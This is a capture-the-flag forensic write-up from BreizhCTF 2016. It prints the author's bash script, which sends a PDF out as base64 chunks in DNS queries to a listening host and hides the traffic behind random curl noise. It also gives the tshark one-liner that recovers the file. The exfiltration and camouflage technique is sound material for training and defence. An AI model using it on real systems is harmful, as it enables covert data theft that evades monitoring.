#BREIZHCTF 2016 : DO NOT STRUGGLE ME

**Category:** FORENSIC |
**Points:** 175 |
**Solves:** 4% |

---

##Code and Write-up

This challenge is a well-known technique we have already had in some CTFs.<br>
But Saxx ask me to do this, and I can not refuse him anything :) <br>
It is a simple DNS query, like this :<br>
`<base64>.ndd`

Here is my script to generate it (and some noise) :
```bash
f="flag_bzh.pdf"
s=4
b=57
c=0

_noise(){
    URL=(
        'https://www.google.fr'
        'https://twitter.com/'
        'https://home.regit.org/'
        'https://fr.wikipedia.org/wiki/Cowabunga'
        'https://kawabunga.ca/'
        'http://www.maredsous.be/'
        'http://www.bierebel.com/styles-de-bieres-belges/bieres-d-abbaye'
        'https://www.saveur-biere.com/fr/3-biere-bouteille/type-abbaye'
        'https://www.brewdog.com/item/16/BrewDog/Punk-IPA.html'
        'https://unepetitemousse.fr/brasserie/brewdog/biere/punk-ipa'
        'http://www.efe.fr/formations/'
        'http://www.ssi.gouv.fr/'
        'http://www.synactiv.fr/'
        'http://www.gfi.fr/'
        'http://www.soprasteria.com/fr'
        ## THX to SaxX for the following ##
        'http://www.jaimelestratra.fr'
        'http://www.p0rng4y.com'
        'http://www.labretagneilpleut.fr'
        'http://www.hollandeflamby.com'
        'https://www.japprendsautiliserdd.fr'
        'https://www.howtodd.fr'
        'https://www.pamelaanderson.xx'
        'https://www.rosie.fr'
        'https://www.bonjourmadame.fr'
    )
    while sleep 1; do
        RAND=$((RANDOM % ${#URL[@]}))
        curl -s --connect-timeout 2 "${URL[RAND]}" &> /dev/null
    done
}
 
_noise & PID="$!"
echo "GO DNS"
## No need to think, take it : https://github.com/m57/dnsteal
for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\n/g");do
    if [[ "$c" -lt "$s"  ]]; then
        echo -ne "$i-."
        c=$(($c+1))
    else
        echo -ne "\n$i-."
        c=1
    fi
done ); do
    dig @192.168.69.29 `echo -ne $r"queuedlamour.tra"|tr "+" "*"` +short
    echo "OK"
    sleep $((RANDOM%4))
done
kill -9 $PID
```

The onliner to solve it:

```bash
>>> tshark -r dns_chall.pcap -Y 'ip.src == 192.168.69.29' -Tfields -edns.qry.name |sed-re's/-.//g;s/queuedlamour.tra//g;s/\*/+/g' | tr -d '\n' |base64 -d > out

>>> file out
out: PDF document, version 1.3 

>>> zathura out
```

The PDF gives the flag.

<br>
Pwned.<br>
__Flag__ : BRZHCTF{je sais plus et j'ai la flemme de scp}

Enjoy,<br>
\- [Notfound](https://www.notfound.ovh)
